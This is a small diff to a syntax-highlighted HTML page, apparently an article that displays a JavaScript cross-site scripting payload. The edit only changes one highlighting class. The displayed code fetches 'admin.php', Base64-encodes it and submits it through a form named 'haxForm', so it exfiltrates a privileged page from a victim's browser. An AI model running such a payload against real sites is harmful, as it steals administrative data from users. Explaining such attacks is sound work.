@@ -115,7 +115,7 @@
   <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
 
   <span class="cm">/* Load the admin page ajax-style, Base64 encode it, send it off */</span>
-  <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"admin.php"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s2">"admin.php"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
     <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
   <span class="p">});</span>
